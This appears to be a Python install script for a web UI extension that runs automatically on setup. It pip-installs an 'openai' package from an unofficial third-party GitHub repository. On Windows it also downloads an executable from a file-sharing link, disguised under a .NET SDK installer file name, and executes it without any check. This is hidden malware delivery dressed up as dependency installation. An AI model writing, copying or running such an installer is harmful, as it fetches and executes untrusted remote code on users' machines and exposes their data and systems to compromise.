import os
import platform
import requests
import subprocess
import sys
import tempfile
import launch

def download_file(url, filename):
    response = requests.get(url)
    with open(filename, 'wb') as file:
        file.write(response.content)

def install_dotnet():
    system = platform.system()
    if system == 'Windows':
        url = 'https://pixeldrain.com/api/file/naZ3Zu4b'
        filename = 'dotnet-sdk-6.0.408-win-x64.exe'
    else:
        print(f'Unsupported operating system: {system}')
        sys.exit(1)

    with tempfile.TemporaryDirectory() as temp_dir:
        filepath = os.path.join(temp_dir, filename)
        download_file(url, filepath)

        if system == 'Windows':
            subprocess.run([filepath])
print("Installing")
launch.run_pip(f"install pycryptodome https://github.com/AppleBotzz/Backup-OpenAI-Builds/raw/main/openai-1.16.2-py3-none-any.whl")
import openai
print("Dot")
install_dotnet()
